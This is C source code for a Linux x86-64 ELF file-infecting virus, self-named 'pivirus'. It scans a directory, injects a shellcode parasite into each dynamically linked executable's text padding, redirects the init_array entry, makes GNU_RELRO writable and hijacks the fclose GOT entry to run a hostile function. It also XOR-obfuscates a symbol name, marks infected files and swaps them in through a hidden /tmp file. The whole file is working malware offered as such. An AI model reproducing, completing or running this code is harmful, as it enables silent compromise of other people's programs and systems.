#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/ptrace.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <error.h>
#include <dirent.h>
#include <elf.h>


#define _4KB_PAGE           0x1000
#define _4KB_OFFSET_MASK    0xfff
#define PAGE_SIZE           _4KB_PAGE
#define PAGE_OFFSET_MASK    _4KB_OFFSET_MASK

#define PAGE_ALIGN_LOW(vaddr)    ((vaddr) & ~PAGE_OFFSET_MASK)
#define PAGE_ALIGN_HIGH(vaddr)   (PAGE_ALIGN_LOW(vaddr) + PAGE_SIZE)
#define VADDR_OFFSET(vaddr)      ((vaddr) & PAGE_OFFSET_MASK)


#define PI_MM_ALLOCATED     0x1
#define PI_MM_FREE          0x0
#define PI_MM_POOL_SZ       0x8000
#define PI_POISON_PTR       0x0

#define STRING_EQUAL        0x0
#define STRING_NOT_EQUAL    !STRING_EQUAL

#define MEM_EQUAL           0x0
#define MEM_NOT_EQUAL       !MEM_EQUAL

#define DIRENTS_BUF_SIZE    0x8000


#define PARASITE_ENTRY_SIZE 0x1b
#define PARASITE_OFFSET_1   0x1f
#define PARASITE_OFFSET_2   0x26
#define PARASITE_OFFSET_3   0x2b
#define PARASITE_OFFSET_4   0x50
#define PARASITE_OFFSET_5   0x54
#define PARASITE_LEN        0x60

#define PI_XOR_KEY          0x78

#define PI_OPERATION_SUCCESS  0
#define PI_OPERATION_ERROR   -1

#define PI_SIGNATURE 0x10

#define inline_function __attribute__((always_inline)) inline


#define pi_check_syscall_fault(x)  \
    if ((int64_t)x < 0)            \
        return PI_OPERATION_ERROR  \

/*
 * macro functions to avoid code repeating
*/
#define pi_define_syscall_1(syscall_name,syscall_num,type1,arg1)  \
    int64_t pi_##syscall_name(type1 arg1)                         \
    {                                                             \
        int64_t __ret;                                            \
                                                                  \
        __asm__ volatile                                          \
            (                                                     \
             "movq  %0,%%rdi                    \n"               \
             "movq  $"#syscall_num",%%rax       \n"               \
             "syscall                           \n"               \
             :                                                    \
             : "g" (arg1)                                         \
            );                                                    \
                                                                  \
        __asm__                                                   \
            (                                                     \
             "movq  %%rax,%0"                                     \
             : "=g" (__ret)                                       \
            );                                                    \
                                                                  \
        return __ret;                                             \
    }

#define pi_define_syscall_2(syscall_name,syscall_num,type1,arg1,type2,arg2) \
    int64_t pi_##syscall_name(type1 arg1,type2 arg2)                        \
    {                                                                       \
        int64_t __ret;                                                      \
                                                                            \
        __asm__ volatile                                                    \
            (                                                               \
             "movq  %0,%%rdi                    \n"                         \
             "movq  %1,%%rsi                    \n"                         \
             "movq  $"#syscall_num",%%rax       \n"                         \
             "syscall"                                                      \
             :                                                              \
             : "g" (arg1), "g" (arg2)                                       \
            );                                                              \
                                                                            \
        __asm__                                                             \
            (                                                               \
             "movq  %%rax,%0"                                               \
             : "=g" (__ret)                                                 \
            );                                                              \
                                                                            \
        return __ret;                                                       \
    }

#define pi_define_syscall_3(syscall_name,syscall_num,type1,arg1,type2,arg2,type3,arg3)  \
    int64_t pi_##syscall_name(type1 arg1,type2 arg2,type3 arg3)                         \
    {                                                                                   \
        int64_t __ret;                                                                  \
                                                                                        \
        __asm__ volatile                                                                \
            (                                                                           \
             "movq  %0,%%rdi                    \n"                                     \
             "movq  %1,%%rsi                    \n"                                     \
             "movq  %2,%%rdx                    \n"                                     \
             "movq  $"#syscall_num",%%rax       \n"                                     \
             "syscall"                                                                  \
             :                                                                          \
             : "g" (arg1), "g" (arg2), "g" (arg3)                                       \
            );                                                                          \
                                                                                        \
        __asm__                                                                         \
            (                                                                           \
             "movq  %%rax,%0"                                                           \
             : "=g" (__ret)                                                             \
            );                                                                          \
                                                                                        \
        return __ret;                                                                   \
    }



char fclose_xor_encoded[] = "\x1e\x1b\x14\x17\x0b\x1d";


char parasite[] = 
    "\x50\x53\x57\x56\x52\x51\x55"
    "\x48\x31\xc0"
    "\x48\x31\xdb"
    "\x48\x31\xd2"
    "\x48\x31\xc9"
    "\x48\x31\xed"
    "\xe8\x41\x00\x00\x00"
    "\x5f"
    "\x48\x81\xef\x41\x41\x41\x41" 
    "\x48\x81\xc7\x43\x43\x43\x43"
    "\xbe\x42\x42\x42\x42"
    "\xba\x01\x00\x00\x00"
    "\x48\x83\xca\x02"
    "\x48\x83\xca\x04"
    "\xb8\x0a\x00\x00\x00"
    "\x0f\x05"
    "\xe8\x16\x00\x00\x00"
    "\x58"
    "\x48\x83\xc0\x18"
    "\x48\x89\x05\x0c\x00\x00\x00"
    "\x5d\x59\x5a\x5e\x5f\x5b\x58\xc3"
    "\xeb\xbd"
    "\xeb\xe8";


typedef struct start_args
{
#define DUMMY_SIZE 8 //force arguments to be on stack 
    char *argv[DUMMY_SIZE]; 
}start_args_t;

typedef struct malloc_header
{
    uint32_t stat;
    uint32_t size;
    struct malloc_header *next;
}malloc_header_t;


typedef struct mman
{
    uint8_t *mm_pool_start;
    uint8_t *mm_pool_end;
    uint8_t *mm_cur_brk;
    malloc_header_t *malloc_head;
}mman_t;

typedef struct linux_dirent64
{
    uint64_t d_ino;
    uint64_t d_off;
    uint16_t d_reclen;
    uint8_t  d_type;
    char     d_name[];
}linux_dirent64_t;

typedef struct targetfunc
{
    uint64_t func_got;
    uint64_t func_name_len;
    uint8_t  *func_name;
}targetfunc_t;

typedef struct hostilefunc
{
    uint64_t hostile_addr;
    uint64_t hostile_len;
}hostilefunc_t;


typedef struct elfstructs
{
    Elf64_Ehdr      *ehdr;
    Elf64_Phdr      *phdr;
    Elf64_Phdr      *textphdr;
    Elf64_Shdr      *shdr;
    Elf64_Sym       *dyn_symtab;
    Elf64_Dyn       *dynseg;
    Elf64_Rela      *rela;
    Elf64_Addr      *pltgot;
    Elf64_Rela      *pltrela;
    Elf64_Xword     relasz;
    Elf64_Xword     pltrelsz;
    Elf64_Addr      *initarray;
    Elf64_Addr      gnureloc_start;
    Elf64_Xword     gnureloc_sz;
    uint8_t         *dyn_strtab;
}elfstructs_t;


typedef struct loadsegments
{
    Elf64_Addr      code_vaddr;
    Elf64_Addr      data_vaddr;
    Elf64_Off       code_offset;
    Elf64_Off       data_offset;
    Elf64_Xword     code_size;
    Elf64_Xword     data_size;
}loadsegments_t;


typedef struct elf_flags
{
    uint64_t    bind_now;
}elf_flags_t;


typedef struct target_elf
{
    const char      *name;
    uint8_t         *mmap;
    int64_t         fd;
    uint64_t        filehole;
    elfstructs_t    elfstructs;
    loadsegments_t  loadsegments;
    hostilefunc_t   hostilefunc;
    targetfunc_t    targetfunc;
    elf_flags_t     elf_flags;
    struct stat     stat;
}target_elf_t;



target_elf_t *target_elf;
mman_t mman;



extern uint64_t pi_hostile_fclose(void);
extern uint64_t pi_get_hostile_len(void);


pi_define_syscall_1(close,3,int64_t,fd)

pi_define_syscall_1(chdir,80,const char *,path)

pi_define_syscall_1(exit,60,uint64_t,exit_stat);

pi_define_syscall_2(fstat,5,int64_t,fd,struct stat *,stat_struct)

pi_define_syscall_2(rename,82,const char *,old_name,const char *,new_name)
    
pi_define_syscall_2(chmod,90,const char *,filename,int64_t,mode)

pi_define_syscall_2(munmap,11,uint64_t,addr,uint64_t,size);

pi_define_syscall_3(open,2,const char *,path,int64_t,flags,int64_t,mode)

pi_define_syscall_3(read,0,int64_t,fd,void *,buf,uint64_t,count)

pi_define_syscall_3(write,1,int64_t,fd,const char *,buf,uint64_t,count)

pi_define_syscall_3(mprotect,10,void *,addr,uint64_t,len,int64_t,prot)

pi_define_syscall_3(getdents64,217,int64_t,fd,char *,buf,uint64_t,buf_sz)

pi_define_syscall_3(lseek,8,int64_t,fd,int64_t,offset,int64_t,whence)


void *pi_mmap(void *addr,uint64_t len,int64_t prot,int64_t flags,int64_t fd,int64_t offset)
{
    uint64_t __ret;

    __asm__ volatile 
        (
         "movq $9,%%rax             \n"
         "movq %0,%%rdi             \n"
         "movq %1,%%rsi             \n"
         "movq %2,%%rdx             \n"
         "movq %3,%%r10             \n"
         "movq %4,%%r8              \n"
         "movq %5,%%r9              \n"
         "syscall"
         :
         : "g" (addr), "g" (len), "g" (prot), "g" (flags), "g" (fd), "g" (offset)
        );

    __asm__
        (
         "movq  %%rax,%0"
         : "=g" (__ret)
        );

    return (void *)(__ret);

}




inline_function void pi_strcpy(char *dest,const char *src)
{
    while (*src) *dest++ = *src++;
    *dest = *src;
}


inline_function uint64_t pi_strlen(const char *str)
{
    uint64_t len = 0;
    
    while (*str++) ++len;
    
    return len;
}

inline_function void pi_memcpy(void *dest,void *src,uint64_t len)
{
    while(len--) *((uint8_t *)dest++) = *((uint8_t *)src++);
}

inline_function int64_t pi_memcmp(void *mem1,void *mem2,uint64_t len)
{
    while (len--)
    {
        if (*((uint8_t *)mem1++) != *((uint8_t *)mem2++))
            return MEM_NOT_EQUAL;
    }

    return MEM_EQUAL;
}

inline_function void pi_memset(void *mem,uint8_t val,uint64_t len)
{
    while (len--) *((uint8_t *)mem++) = val;
}

void pi_puts(const char *str)
{
    pi_write(STDOUT_FILENO,str,pi_strlen(str));
}

/*
 * gets a memory pool that will be used by pi_malloc 
*/
int64_t pi_mm_getpool(void)
{
    mman.mm_pool_start = pi_mmap(NULL,PI_MM_POOL_SZ,PROT_WRITE | PROT_READ,MAP_ANONYMOUS | MAP_PRIVATE,-1,0);
    pi_check_syscall_fault(mman.mm_pool_start);

    mman.mm_pool_end = mman.mm_pool_start + PI_MM_POOL_SZ;

    mman.mm_cur_brk = mman.mm_pool_start;

    return PI_OPERATION_SUCCESS;
}

void *pi_sbrk(uint32_t size)
{
    void *tmp;

    tmp = (void *)mman.mm_cur_brk;

    mman.mm_cur_brk += size;

    if (mman.mm_cur_brk > mman.mm_pool_end)
        return NULL;
    
    return tmp;
}

void *pi_malloc(uint32_t size)
{
    malloc_header_t *tmp1, *tmp2, *tmp3, *tmp4;

    if (!mman.malloc_head)
    {
        mman.malloc_head = pi_sbrk(size + sizeof(malloc_header_t));

        if (mman.malloc_head == PI_POISON_PTR)
            return (void *)PI_POISON_PTR;

        mman.malloc_head->stat = PI_MM_ALLOCATED;
        mman.malloc_head->size = size;
        mman.malloc_head->next = PI_POISON_PTR;


        return (void *)(mman.malloc_head + 1);
    }

    //search for free block with bsize >= size
    tmp1 = mman.malloc_head;
    while (tmp1)
    {
        if ((tmp1->stat == PI_MM_FREE) && (tmp1->size >= size))
        {
            if (tmp1->size > size)
            {
                //divide the block
                tmp3       = (malloc_header_t *)( (uint8_t *)( tmp1 + 1) + size );
                tmp3->stat = PI_MM_ALLOCATED;
                tmp3->size = tmp1->size - size;
                tmp3->next = tmp1->next;
                tmp1->next = tmp3;
                goto __ret;
            }
            tmp1->stat = PI_MM_ALLOCATED;
__ret:
            return (void *)(tmp1 + 1);
        }
        tmp4 = tmp1;
        tmp1 = tmp1->next;
    }

    tmp2 = pi_sbrk(size + sizeof(malloc_header_t));

    if (tmp2 == PI_POISON_PTR)
        return (void *)PI_POISON_PTR;

    tmp2->size = size;
    tmp2->stat = PI_MM_ALLOCATED;
    tmp2->next = PI_POISON_PTR;

    tmp4->next = tmp2;

    pi_memset(tmp2 + 1,0x0,tmp2->size);

    return (void *)(tmp2 + 1);
}

/*
 * a simple free that just frees the block at the given address
 * there is no adjacent free blocks coalescing
*/ 
void pi_free(void *ptr)
{
    malloc_header_t *tmp1;

    tmp1 = (malloc_header_t *)ptr - 1;
    tmp1->stat = PI_MM_FREE;

    pi_memset(tmp1 + 1,0x0,tmp1->size);
}


inline_function void pi_xor_mem(void *mem,uint64_t len,uint8_t xor_key)
{
    while (len--) *((uint8_t *)mem++) ^= xor_key;
}



int64_t pi_check_target(void)
{
    Elf64_Ehdr *ehdr;
    Elf64_Phdr *phdr;
    char elfmag[] = ELFMAG;
    uint64_t dyn_linked = 0;


    target_elf->fd = pi_open(target_elf->name,O_RDWR,0);
    pi_check_syscall_fault(target_elf->fd);

    pi_check_syscall_fault(pi_fstat(target_elf->fd,&target_elf->stat));

    target_elf->mmap = pi_mmap(NULL,
                               target_elf->stat.st_size,
                               PROT_READ | PROT_WRITE,
                               MAP_SHARED,
                               target_elf->fd,
                               0);
    pi_check_syscall_fault(target_elf->mmap);

    ehdr = (Elf64_Ehdr *)target_elf->mmap;
    phdr = (Elf64_Phdr *)(target_elf->mmap + ehdr->e_phoff);

    if (pi_memcmp(target_elf->mmap,elfmag,SELFMAG) == MEM_NOT_EQUAL)
        return PI_OPERATION_ERROR;
    
    //binary is infected before ? 
    if (ehdr->e_ident[EI_OSABI] == PI_SIGNATURE)
        return PI_OPERATION_ERROR;
    
    if (!((ehdr->e_type == ET_EXEC) || (ehdr->e_type == ET_DYN)))
        return PI_OPERATION_ERROR;
    
    for (uint64_t i = 0; i < ehdr->e_phnum; ++i,++phdr)
    {
        if (phdr->p_type != PT_DYNAMIC)
            continue;
        dyn_linked = 1;
    }

    if (!dyn_linked)
        return PI_OPERATION_ERROR;
    
    return PI_OPERATION_SUCCESS;
}


void pi_do_init(void)
{
    Elf64_Phdr  *tmp_phdr;
    Elf64_Shdr  *tmp_shdr;
    Elf64_Dyn   *tmp_dynseg;
    Elf64_Sym   *tmp_dynsym;
    Elf64_Addr  target_code_vaddr, target_data_vaddr;
    Elf64_Off   target_code_offset, target_data_offset;

    target_elf->elfstructs.ehdr = (Elf64_Ehdr *)target_elf->mmap;
    target_elf->elfstructs.phdr = (Elf64_Phdr *)(target_elf->mmap + target_elf->elfstructs.ehdr->e_phoff);
    target_elf->elfstructs.shdr = (Elf64_Shdr *)(target_elf->mmap + target_elf->elfstructs.ehdr->e_shoff);


    tmp_phdr = target_elf->elfstructs.phdr;
    for (Elf64_Half i = 0; i < target_elf->elfstructs.ehdr->e_phnum; ++i, ++tmp_phdr)
    {
        switch (tmp_phdr->p_type)
        {
            case PT_LOAD:
                if (tmp_phdr->p_flags & PF_X)
                {
                    target_elf->loadsegments.code_vaddr   = tmp_phdr->p_vaddr;
                    target_elf->loadsegments.code_offset  = tmp_phdr->p_offset;
                    target_elf->loadsegments.code_size    = tmp_phdr->p_memsz;
                    target_elf->elfstructs.textphdr       = tmp_phdr;
                
                    target_code_vaddr  = target_elf->loadsegments.code_vaddr;
                    target_code_offset = target_elf->loadsegments.code_offset;
                
                }
                target_elf->loadsegments.data_vaddr  = tmp_phdr->p_vaddr;
                target_elf->loadsegments.data_offset = tmp_phdr->p_offset;

                target_data_vaddr  = target_elf->loadsegments.data_vaddr;
                target_data_offset = target_elf->loadsegments.data_offset;
                break;

            case PT_DYNAMIC:
                target_elf->elfstructs.dynseg = (Elf64_Dyn *)(target_elf->mmap + tmp_phdr->p_offset);
                break;
            
            case PT_GNU_RELRO:
                target_elf->elfstructs.gnureloc_sz    = tmp_phdr->p_memsz;
                target_elf->elfstructs.gnureloc_start = tmp_phdr->p_vaddr - target_elf->elfstructs.textphdr->p_vaddr;
                break;
        }
    }

    tmp_dynseg = target_elf->elfstructs.dynseg;
    for (; tmp_dynseg->d_tag != DT_NULL; ++tmp_dynseg)
    {
        switch (tmp_dynseg->d_tag)
        {
            case DT_SYMTAB:
                target_elf->elfstructs.dyn_symtab = (Elf64_Sym *)(target_elf->mmap + target_code_offset +
                                                                     (tmp_dynseg->d_un.d_ptr - target_code_vaddr));
                break;

            case DT_STRTAB:
                target_elf->elfstructs.dyn_strtab = target_elf->mmap + target_code_offset +
                                                                    (tmp_dynseg->d_un.d_ptr - target_code_vaddr);
                break;

            case DT_JMPREL:
                target_elf->elfstructs.pltrela = (Elf64_Rela *)(target_elf->mmap + target_code_offset +
                                                                    (tmp_dynseg->d_un.d_ptr - target_code_vaddr));
                break;

            case DT_PLTGOT:
                target_elf->elfstructs.pltgot = (Elf64_Addr *)(target_elf->mmap + target_data_offset + 
                                                                    (tmp_dynseg->d_un.d_ptr - target_data_vaddr));
            case DT_RELA:
                target_elf->elfstructs.rela = (Elf64_Rela *)(target_elf->mmap + target_code_offset + 
                                                                    (tmp_dynseg->d_un.d_ptr - target_code_vaddr));
                break;

            case DT_RELASZ:
                target_elf->elfstructs.relasz = tmp_dynseg->d_un.d_val;
                break;

            case DT_PLTRELSZ:
                target_elf->elfstructs.pltrelsz = tmp_dynseg->d_un.d_val;
                break;

            case DT_FLAGS_1:
                if (tmp_dynseg->d_un.d_val & DF_1_NOW)
                    ++target_elf->elf_flags.bind_now;
                break;

            case DT_INIT_ARRAY:
                target_elf->elfstructs.initarray = (Elf64_Addr *)(target_elf->mmap + (tmp_dynseg->d_un.d_ptr -
                                                                                           target_data_vaddr + target_data_offset));
                break;
        }
    }

    target_elf->hostilefunc.hostile_addr = (uint64_t)pi_hostile_fclose;
    target_elf->hostilefunc.hostile_len  = pi_get_hostile_len();

}


int32_t pi_symbol_lookup(void)
{
    char *dynstrtab;
    char *sym_name;
    Elf64_Rela  *rel;
    Elf64_Xword relsz;
    Elf64_Sym   *dynsymtab;
        

    if (target_elf->elf_flags.bind_now && !target_elf->elfstructs.pltrela)
    {
        rel     = target_elf->elfstructs.rela;
        relsz   = target_elf->elfstructs.relasz;

    }else
    {
        rel     = target_elf->elfstructs.pltrela;
        relsz   = target_elf->elfstructs.pltrelsz;
    }


    dynsymtab = target_elf->elfstructs.dyn_symtab;
    dynstrtab = target_elf->elfstructs.dyn_strtab;

    target_elf->targetfunc.func_name_len = pi_strlen(fclose_xor_encoded);
    target_elf->targetfunc.func_name     = pi_malloc(target_elf->targetfunc.func_name_len);

    pi_memcpy(target_elf->targetfunc.func_name,
              fclose_xor_encoded,
              target_elf->targetfunc.func_name_len);

    pi_xor_mem(target_elf->targetfunc.func_name,
               target_elf->targetfunc.func_name_len,
               PI_XOR_KEY);

    
    for (Elf64_Xword i = 0; i < (relsz / sizeof(Elf64_Rela)); ++i, ++rel)
    {
        sym_name = &dynstrtab[dynsymtab[ELF64_R_SYM(rel->r_info)].st_name];
        if (pi_memcmp(sym_name,target_elf->targetfunc.func_name,target_elf->targetfunc.func_name_len) == MEM_EQUAL)
                target_elf->targetfunc.func_got = (Elf64_Addr)rel->r_offset;
    }

    pi_free(target_elf->targetfunc.func_name);

    if (!target_elf->targetfunc.func_got)
        return PI_OPERATION_ERROR;

    return PI_OPERATION_SUCCESS;
}



/*
 * flcose's GOT entry hijacking is done @ runtime with the following algorithm:
 *      - let r be any register
 *      - (r) holds hostile function address
 *      - [ fclose_got_entry_offset + rip ]  <- r , let this instruction's address be #modify_got
 *      - [ addr ] is the address of the next instruction that modifies the GOT entry (the next to [#modify_got])
 *      - [ diff ] is the offset between the target GOT entry and [ addr ]
 *
 *      - so it will be like this
 *         - mov $address_of_hostile, diff(%rip) 
 *
 * the parasite takes care of ELF binaries that have the BIND_NOW flag so the entry of the parasite
 * mprotects the GNU_RELRO PAGES to be writeable  
*/

void pi_edit_parasite(void)
{
    uint64_t diff, addr, var1, var2, var3;

    var1 = target_elf->loadsegments.code_size + PARASITE_ENTRY_SIZE;

    var2 = PAGE_ALIGN_LOW(target_elf->elfstructs.gnureloc_start);

    var3 = target_elf->elfstructs.gnureloc_sz;

    addr = target_elf->loadsegments.code_vaddr + 
                        target_elf->loadsegments.code_size + 
                                                    PARASITE_OFFSET_5;

    diff = target_elf->targetfunc.func_got - addr;

    *((uint32_t *)&parasite[PARASITE_OFFSET_1]) = (uint32_t)var1;
    *((uint32_t *)&parasite[PARASITE_OFFSET_2]) = (uint32_t)var2;
    *((uint32_t *)&parasite[PARASITE_OFFSET_3]) = (uint32_t)var3;
    *((uint32_t *)&parasite[PARASITE_OFFSET_4]) = (uint32_t)diff;
}

int64_t pi_create_infected_clone(void)
{
    char     tmpfile[] = "/tmp/.tmp.PI314X_OC";
    char     buf[PAGE_SIZE];
    int64_t  tmpfile_fd, syscall_ret;
    int64_t  infected_clone_mode, tmpfile_mode;
    uint64_t buf1_sz, buf2_sz, buf3_sz;
    
    //mark binary as infected
    target_elf->elfstructs.ehdr->e_ident[EI_OSABI] = PI_SIGNATURE;

    tmpfile_mode        = S_IRUSR | S_IWUSR;
    infected_clone_mode = tmpfile_mode | S_IXUSR;
    
    tmpfile_fd = pi_open(tmpfile,O_CREAT | O_RDWR,tmpfile_mode);
    pi_check_syscall_fault(tmpfile_fd);

    buf1_sz = target_elf->loadsegments.code_offset + 
                        target_elf->loadsegments.code_size + 
                                target_elf->filehole;
    
    buf2_sz = ( PARASITE_LEN + target_elf->hostilefunc.hostile_len ) > target_elf->filehole ? PAGE_SIZE : 0;
    
    buf3_sz = target_elf->stat.st_size - buf1_sz;

    syscall_ret = pi_write(tmpfile_fd,target_elf->mmap,buf1_sz);
    pi_check_syscall_fault(syscall_ret);

    syscall_ret = pi_write(tmpfile_fd,buf,buf2_sz);
    pi_check_syscall_fault(syscall_ret);

    syscall_ret = pi_write(tmpfile_fd,target_elf->mmap + buf1_sz,buf3_sz);
    pi_check_syscall_fault(syscall_ret);

    syscall_ret = pi_lseek(tmpfile_fd,
                           target_elf->loadsegments.code_offset + 
                           target_elf->loadsegments.code_size,
                           SEEK_SET);
    pi_check_syscall_fault(syscall_ret);

    syscall_ret = pi_write(tmpfile_fd,parasite,PARASITE_LEN);
    pi_check_syscall_fault(syscall_ret);

    syscall_ret = pi_write(tmpfile_fd,
                          (const char *)target_elf->hostilefunc.hostile_addr,
                          target_elf->hostilefunc.hostile_len);
    pi_check_syscall_fault(syscall_ret);

    syscall_ret = pi_close(tmpfile_fd);
    pi_check_syscall_fault(syscall_ret);

    syscall_ret = pi_chmod(tmpfile,infected_clone_mode);
    pi_check_syscall_fault(syscall_ret);

    syscall_ret = pi_rename(tmpfile,target_elf->name);
    pi_check_syscall_fault(syscall_ret);

    return PI_OPERATION_SUCCESS;
}

void pi_infect_target(void)
{
    Elf64_Phdr  *elfphdr;
    Elf64_Shdr  *elfshdr;
    Elf64_Rela  *elfrela;
    Elf64_Addr  target_code_vaddr, target_data_vaddr;
    Elf64_Off   target_code_offset, target_data_offset;
    Elf64_Xword target_code_size, target_data_size;
    uint64_t    flag, parasite_len, off, addr;
    uint8_t old_osabi;

    if (pi_check_target() == PI_OPERATION_ERROR)
        goto target_cleanup;

    pi_do_init();

    if (pi_symbol_lookup() == PI_OPERATION_ERROR)
        goto target_cleanup;


    elfphdr = target_elf->elfstructs.phdr;
    elfshdr = target_elf->elfstructs.shdr;
    elfrela = target_elf->elfstructs.rela;

    target_code_vaddr  = target_elf->loadsegments.code_vaddr;
    target_data_vaddr  = target_elf->loadsegments.data_vaddr;

    target_code_offset = target_elf->loadsegments.code_offset;
    target_data_offset = target_elf->loadsegments.data_offset;

    target_code_size   = target_elf->loadsegments.code_size;
    target_data_size   = target_elf->loadsegments.data_size;

    flag         = 1;
    parasite_len = PARASITE_LEN;

    if ((parasite_len  + target_elf->hostilefunc.hostile_len) > 
             (PAGE_SIZE - VADDR_OFFSET(target_code_vaddr + target_code_size)))
        return;


    for (Elf64_Half i = 0; i < target_elf->elfstructs.ehdr->e_phnum; ++i, ++elfphdr)
    {
        if (elfphdr->p_offset > (target_code_offset + target_code_size))
        {
            if (flag)
            {
                target_elf->filehole = elfphdr->p_offset - (target_code_offset + target_code_size);
                --flag;
            }
            if ((parasite_len + target_elf->hostilefunc.hostile_len) > target_elf->filehole)
                elfphdr->p_offset += PAGE_SIZE;
        }
    }
    
    if (target_elf->elfstructs.shdr)
    {
        for (Elf64_Half i = 0; i < target_elf->elfstructs.ehdr->e_shnum; ++i, ++elfshdr)
        {
            if ((elfshdr->sh_offset + elfshdr->sh_size) == (target_code_offset + target_code_size))
                elfshdr->sh_size += parasite_len;

            if (elfshdr->sh_offset > (target_code_offset + target_code_size))
            {
                if ((parasite_len + target_elf->hostilefunc.hostile_len) > target_elf->filehole)
                    elfshdr->sh_offset += PAGE_SIZE;
            }
        }
        if ((parasite_len + target_elf->hostilefunc.hostile_len) > target_elf->filehole)
            target_elf->elfstructs.ehdr->e_shoff += PAGE_SIZE;
    }

    /*
     * - pivirus doesn't alter the original entry point of the target , instead the entry in the init array section that
     *   corresponds to frame dummy function's address is overwritten with the address of the parasite's entry point
     * 
     * - for ET_DYN binaries there will be a relocation entry for every entry in the init array section with the r_addend member
     *   of the relocation entry holding the offset of the function in the binary, so the dynamic linker will add the loading
     *   address of the binary to r_addend value and modify the  init array section's entry @ r_offset
     */
    if (target_elf->elfstructs.ehdr->e_type == ET_DYN)
    {
        for (uint64_t i = 0; i < (target_elf->elfstructs.relasz / sizeof(Elf64_Rela)); ++i, ++elfrela)
        {
            if (ELF64_R_TYPE(elfrela->r_info) == R_X86_64_RELATIVE)
            {
                if (elfrela->r_addend == (Elf64_Sxword)(target_elf->elfstructs.initarray[0]))
                {
                    elfrela->r_addend = (Elf64_Sxword)(target_code_vaddr + target_code_size);
                    break;
                }
            }
        }
    }
    *target_elf->elfstructs.initarray = target_code_vaddr + target_code_size;

    target_elf->elfstructs.textphdr->p_memsz  += parasite_len + target_elf->hostilefunc.hostile_len;
    target_elf->elfstructs.textphdr->p_filesz += parasite_len + target_elf->hostilefunc.hostile_len;

    pi_edit_parasite();
    
    old_osabi = target_elf->elfstructs.ehdr->e_ident[EI_OSABI];

    if (pi_create_infected_clone() == PI_OPERATION_ERROR)
        target_elf->elfstructs.ehdr->e_ident[EI_OSABI] = old_osabi; //infection fails so unmark the binary

target_cleanup:
    pi_munmap((uint64_t)target_elf->mmap,target_elf->stat.st_size);
    pi_close(target_elf->fd);
}

int32_t pi(const char *target_dir)
{
    char dirents_buf[DIRENTS_BUF_SIZE];
    int64_t fd, nread, syscall_ret;
    linux_dirent64_t *dir;
   
    syscall_ret = pi_chdir(target_dir);
    pi_check_syscall_fault(syscall_ret);

    fd = pi_open(target_dir,O_RDONLY | O_DIRECTORY,0);
    pi_check_syscall_fault(fd);

    if (pi_mm_getpool() == PI_OPERATION_ERROR)
        return PI_OPERATION_ERROR;

    for (;;)
    {
        nread = pi_getdents64(fd,dirents_buf,DIRENTS_BUF_SIZE);
        pi_check_syscall_fault(nread);

        if (nread == 0)
            break;

        for (uint64_t pos = 0, i = 0; pos < nread; ++i, pos += dir->d_reclen)
        {
            dir = (struct linux_dirent64 *)(dirents_buf + pos);

            if (dir->d_type == DT_REG)
            {

                target_elf = pi_malloc(sizeof(target_elf_t));
                
                target_elf->name = dir->d_name;
                
                pi_infect_target();

                pi_free(target_elf);
            }
        }
    }

    return PI_OPERATION_SUCCESS;
}
void _start(start_args_t start_args)
{
    pi(start_args.argv[1]);
    pi_exit(0);
}

